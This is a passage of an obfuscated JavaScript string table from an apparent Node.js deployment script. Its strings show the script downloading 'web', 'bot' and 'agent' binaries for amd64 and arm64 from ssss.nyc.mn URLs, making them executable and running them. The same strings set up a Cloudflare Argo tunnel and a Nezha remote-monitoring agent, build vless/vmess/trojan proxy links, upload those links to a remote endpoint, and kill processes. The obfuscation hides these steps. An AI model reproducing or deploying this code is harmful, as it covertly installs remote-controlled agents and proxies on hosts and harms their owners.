64.ssss.nyc.mn/web','trim','\x20>\x20nul\x202>&1','NEZHA_PORT','AUTO_ACCESS','Empowerment\x20failed\x20for\x20','\x20-c\x20','2053','https://amd64.ssss.nyc.mn/bot','(((.+)+)+)+$','Download\x20','none','{}.constructor(\x22return\x20this\x22)(\x20)','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','stream','includes','unlinkSync','finish','&path=%2Fvless-argo%3Fed%3D2560#','warn','__proto__','/dev/null','quic','SUB_PATH','search','php\x20running\x20error:\x20','\x0a\x20\x20\x0atrojan://','9HkflzE','readFileSync','win32','path','get','26279790hLmKra','http','chmod','statSync','log','isFile','stringify','ARGO_DOMAIN','application/json','listen','FILE_PATH','/api/add-subscriptions','Empowerment\x20success\x20for\x20','taskkill\x20/f\x20/im\x20','table','sub.txt','--tls','/api/add-nodes','env','/trojan-argo','443','utf-8','ArgoDomain:','info','then','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','boot.log','2087','unlink','web\x20running\x20error:\x20','npm\x20running\x20error:\x20','response','Skipping\x20adding\x20automatic\x20access\x20task','map','ARGO_AUTH','https://amd64.ssss.nyc.mn/agent','set','fileUrl','UPLOAD_URL','bind','2096','xtls-rprx-vision','Hello\x20world!','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Subscription\x20uploaded\x20successfully','true','console','vless','/vmess-argo?ed=2560','toString','post','\x20failed:\x20','\x0a\x20\x20credentials-file:\x20','automatic\x20access\x20task\x20added\x20successfully','error','\x20-c\x20\x22','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/bot'];_0x4bc1=function(){return _0x1c8b52;};return _0x4bc1();}
